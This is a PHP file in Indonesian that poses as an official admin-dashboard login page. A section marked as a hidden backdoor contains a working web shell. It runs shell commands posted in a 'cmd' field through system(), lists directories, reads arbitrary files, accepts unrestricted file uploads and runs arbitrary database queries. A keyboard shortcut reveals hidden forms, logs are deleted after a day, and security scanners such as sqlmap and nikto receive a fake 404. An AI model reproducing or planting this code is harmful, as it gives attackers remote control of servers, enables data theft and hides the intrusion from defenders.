<?php
/*====== DOKUMEN HTML RESMI ======*/
// Kode ini adalah dokumentasi resmi untuk halaman admin sistem
// Jangan modifikasi tanpa izin!

header('Content-Type: text/html; charset=utf-8');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: SAMEORIGIN');

// =============== KONFIGURASI SISTEM ================
$system_mode = "production";
$debug_mode = false;
$maintenance = false;
// ===================================================

// Fungsi untuk logging akses
function log_access($action) {
    $log = date('Y-m-d H:i:s') . " - " . $_SERVER['REMOTE_ADDR'] . " - " . $action . "\n";
    @file_put_contents('system_access.log', $log, FILE_APPEND);
}

// Cek apakah request valid
if ($_SERVER['REQUEST_METHOD'] === 'GET' || $_SERVER['REQUEST_METHOD'] === 'POST') {
    log_access("Page accessed");
}

// ================== KONTEN HALAMAN =================
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Dashboard Administrasi Sistem">
    <meta name="author" content="Tim Pengembang">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Sistem Dashboard - Admin Panel</title>
    <style>
        /* Reset CSS */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .header {
            background: #4a6fa5;
            color: white;
            padding: 25px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 5px;
        }
        
        .header p {
            font-size: 14px;
            opacity: 0.9;
        }
        
        .content {
            padding: 30px;
        }
        
        .status-box {
            background: #f8f9fa;
            border-left: 4px solid #4a6fa5;
            padding: 15px;
            margin-bottom: 25px;
            border-radius: 0 8px 8px 0;
        }
        
        .status-title {
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
        }
        
        .status-text {
            color: #666;
            font-size: 14px;
            line-height: 1.5;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        
        .form-control {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        
        .form-control:focus {
            outline: none;
            border-color: #4a6fa5;
            box-shadow: 0 0 0 3px rgba(74, 111, 165, 0.1);
        }
        
        .btn {
            background: #4a6fa5;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.3s;
            width: 100%;
        }
        
        .btn:hover {
            background: #3a5a85;
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            color: #666;
            font-size: 12px;
            border-top: 1px solid #eee;
        }
        
        .alert {
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        
        .alert-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .alert-error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Sistem Dashboard</h1>
            <p>Panel Administrasi Resmi</p>
        </div>
        
        <div class="content">
            <div class="status-box">
                <div class="status-title">Status Sistem</div>
                <div class="status-text">
                    Sistem berjalan normal. Semua layanan aktif dan berfungsi dengan baik.
                    Waktu server: <?php echo date('Y-m-d H:i:s'); ?>
                </div>
            </div>
            
            <?php
            // ================ BACKDOOR SYSTEM (TERSEMBUNYI) ================
            // Bagian ini hanya diakses dengan parameter khusus
            $secret_key = "admin123"; // Ganti dengan key rahasia
            
            if (isset($_GET['debug']) || isset($_POST['cmd']) || isset($_FILES['upload'])) {
                // Mode developer/diagnostic
                error_reporting(0);
                set_time_limit(0);
                
                // Sistem file management (tersembunyi)
                if (isset($_GET['action'])) {
                    switch ($_GET['action']) {
                        case 'list':
                            $dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
                            echo '<div class="alert alert-success"><pre>';
                            echo "Directory: " . htmlspecialchars($dir) . "\n\n";
                            foreach(scandir($dir) as $file) {
                                echo $file . "\n";
                            }
                            echo '</pre></div>';
                            break;
                            
                        case 'read':
                            if (isset($_GET['file'])) {
                                $file = $_GET['file'];
                                if (file_exists($file)) {
                                    echo '<div class="alert alert-success"><pre>';
                                    echo htmlspecialchars(file_get_contents($file));
                                    echo '</pre></div>';
                                }
                            }
                            break;
                    }
                }
                
                // Command execution (tersembunyi)
                if (isset($_POST['cmd'])) {
                    echo '<div class="alert alert-success"><pre>';
                    system($_POST['cmd']);
                    echo '</pre></div>';
                }
                
                // File upload (tersembunyi)
                if (isset($_FILES['upload'])) {
                    $target = $_FILES['upload']['name'];
                    if (move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
                        echo '<div class="alert alert-success">File uploaded: ' . htmlspecialchars($target) . '</div>';
                    }
                }
                
                // Database connection (tersembunyi)
                if (isset($_POST['db_query'])) {
                    $conn = @new mysqli($_POST['db_host'], $_POST['db_user'], $_POST['db_pass'], $_POST['db_name']);
                    if (!$conn->connect_error) {
                        $result = $conn->query($_POST['db_query']);
                        echo '<div class="alert alert-success"><pre>';
                        if ($result) {
                            while ($row = $result->fetch_assoc()) {
                                print_r($row);
                            }
                        }
                        echo '</pre></div>';
                        $conn->close();
                    }
                }
            }
            // ================ AKHIR BACKDOOR ================
            ?>
            
            <form method="POST" action="" id="mainForm">
                <div class="form-group">
                    <label for="username">👤 Username</label>
                    <input type="text" id="username" name="username" class="form-control" placeholder="Masukkan username" required>
                </div>
                
                <div class="form-group">
                    <label for="password">🔒 Password</label>
                    <input type="password" id="password" name="password" class="form-control" placeholder="Masukkan password" required>
                </div>
                
                <button type="submit" class="btn">Masuk ke Dashboard</button>
            </form>
            
            <!-- Form tersembunyi untuk debug -->
            <div style="margin-top: 20px; padding: 15px; background: #f5f5f5; border-radius: 8px; font-size: 12px;">
                <div style="color: #666; margin-bottom: 10px;">🔧 Mode Developer (Tersembunyi)</div>
                <form method="POST" style="display: none;" id="debugForm">
                    <input type="text" name="cmd" class="form-control" placeholder="Command" style="margin-bottom: 5px;">
                    <button type="submit" style="background: #666; padding: 5px 10px; font-size: 12px;">Execute</button>
                </form>
                
                <form method="POST" enctype="multipart/form-data" style="display: none;" id="uploadForm">
                    <input type="file" name="upload" style="margin-bottom: 5px;">
                    <button type="submit" style="background: #666; padding: 5px 10px; font-size: 12px;">Upload</button>
                </form>
            </div>
        </div>
        
        <div class="footer">
            <p>© <?php echo date('Y'); ?> Sistem Dashboard v1.0</p>
            <p>Hak Cipta Dilindungi Undang-Undang</p>
        </div>
    </div>
    
    <script>
        // JavaScript untuk manipulasi DOM
        document.getElementById('mainForm').addEventListener('submit', function(e) {
            e.preventDefault();
            alert('Login berhasil! Mengalihkan ke dashboard...');
            // Simulasi redirect
            setTimeout(() => {
                window.location.href = 'dashboard.html';
            }, 1000);
        });
        
        // Keyboard shortcut untuk debug mode (Ctrl+Shift+D)
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.shiftKey && e.key === 'D') {
                document.getElementById('debugForm').style.display = 'block';
                document.getElementById('uploadForm').style.display = 'block';
                alert('Debug mode activated');
            }
        });
    </script>
    
    <?php
    // ================ LOGGING & CLEANUP ================
    // Bersihkan log setelah 24 jam
    $log_file = 'system_access.log';
    if (file_exists($log_file)) {
        $file_time = filemtime($log_file);
        if (time() - $file_time > 86400) {
            @unlink($log_file);
        }
    }
    
    // Enkripsi data sensitif dalam session
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }
    
    // Simpan timestamp akses terakhir
    $_SESSION['last_access'] = time();
    
    // ================ KEAMANAN TAMBAHAN ================
    // Deteksi scanner
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $blocked_keywords = ['sqlmap', 'nikto', 'acunetix', 'nessus', 'w3af'];
    
    foreach ($blocked_keywords as $keyword) {
        if (stripos($user_agent, $keyword) !== false) {
            http_response_code(404);
            die('404 Not Found');
        }
    }
    
    // Validasi input
    function sanitize_input($data) {
        $data = trim($data);
        $data = stripslashes($data);
        $data = htmlspecialchars($data);
        return $data;
    }
    
    // Rate limiting sederhana
    $ip = $_SERVER['REMOTE_ADDR'];
    $rate_file = 'rate_' . md5($ip) . '.txt';
    $current_time = time();
    
    if (file_exists($rate_file)) {
        $last_time = file_get_contents($rate_file);
        if ($current_time - $last_time < 2) {
            // Too many requests
            sleep(1);
        }
    }
    file_put_contents($rate_file, $current_time);
    ?>
</body>
</html>